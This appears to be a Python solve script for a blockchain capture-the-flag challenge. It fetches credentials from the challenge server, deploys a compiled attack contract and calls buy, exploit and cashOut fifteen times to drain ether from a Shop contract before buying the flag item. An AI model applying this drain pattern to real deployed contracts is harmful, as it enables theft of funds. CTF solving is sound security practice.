from web3 import Web3
from solcx import install_solc, set_solc_version, get_installed_solc_versions, get_installable_solc_versions, compile_files
import pprint
from IPython import embed

from eth_account import Account

import pwn

# get info from remote nc
r = pwn.remote('blockchain.n00bzUnit3d.xyz', 39999)
r.recvuntil(b'Choice: ')
r.sendline(b'1')
contract_address = r.recvline().strip().decode().split(' ')[-1]
rpc_url = r.recvline().strip().decode().split(' ')[-1]
private_key = r.recvline().strip().decode().split(' ')[-1]
wallet_address = r.recvline().strip().decode().split(' ')[-1]
secret = r.recvline().strip().decode().split(' ')[-1]
r.recvline()
r.close()

print(f'{contract_address=}')
print(f'{rpc_url=}')
print(f'{private_key=}')
print(f'{wallet_address=}')
print(f'{secret=}')

# Connect to remote contract
web3 = Web3(Web3.HTTPProvider(rpc_url))
account = Account.from_key(private_key)
print(f"Account Address: {account.address}")
print(f"Account Balance: {web3.from_wei(web3.eth.get_balance(account.address), 'ether')} ether")

if web3.eth.get_balance(account.address) < web3.to_wei(5, "ether"): raise ValueError("not enough money")
if account.address != wallet_address: raise ValueError("private key and wallet address do not correspond to each other")

if False:
    for acct in web3.eth.accounts:
        print(f"account: {acct}, balance: {Web3.from_wei(web3.eth.get_balance(acct.address), 'ether')} ether")
        
    for i in range(20):
        print("setup contract", i, web3.eth.get_storage_at(contract_address, i).hex())

def send_transaction(function, *args, value=0):
    txn = function(*args).build_transaction({
        'from': wallet_address,
        'nonce': web3.eth.get_transaction_count(wallet_address),
        'gas': 3000000,
        'gasPrice': web3.to_wei('1', 'gwei'),
        'value': value
    })
    signed_txn = web3.eth.account.sign_transaction(txn, private_key=private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
    return tx_hash

# Compile SOL
install_solc('0.6.8')
set_solc_version('0.6.8')
compiled_sol = compile_files(["Shop.sol", "Attack.sol"], output_values=['abi', 'bin'])
shopContract = compiled_sol['Shop.sol:Shop']
attackContract = compiled_sol['Attack.sol:attack']

exploit = web3.eth.contract(bytecode=attackContract['bin'], abi=attackContract['abi'])
shop = web3.eth.contract(address=contract_address, abi=shopContract['abi'])
tx_hash = send_transaction(exploit.constructor, contract_address)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
attack = web3.eth.contract(tx_receipt.contractAddress, abi=attackContract['abi'])
print(f"Attack deployed at address: {tx_receipt.contractAddress}")

for i in range(15):
    print(f'iteration {i + 1}')
    # Exploit
    print(f'Shop balance: {web3.from_wei(web3.eth.get_balance(contract_address), "ether")} ether')

    # buy 1 item 0
    tx_hash = tx_hash = send_transaction(shop.functions.buy, 0, 1, value=web3.to_wei(5, "ether"))
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    pprint.pprint(receipt)

    # attack
    tx_hash = send_transaction(attack.functions.exploit)
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    pprint.pprint(receipt)

    # retreive money
    tx_hash = send_transaction(attack.functions.cashOut, account.address)
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    pprint.pprint(receipt)

    print(f"Account Balance: {web3.from_wei(web3.eth.get_balance(account.address), 'ether')} ether")
    
if web3.eth.get_balance(account.address) < web3.to_wei(1337, "ether"): raise ValueError("not enough money")

# buy 1 item 3
tx_hash = send_transaction(shop.functions.buy, 3, 1, value=web3.to_wei(1337, "ether"))
receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
pprint.pprint(receipt)

# check for solve
tx_hash = send_transaction(shop.functions.isChallSolved)
receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
pprint.pprint(receipt)
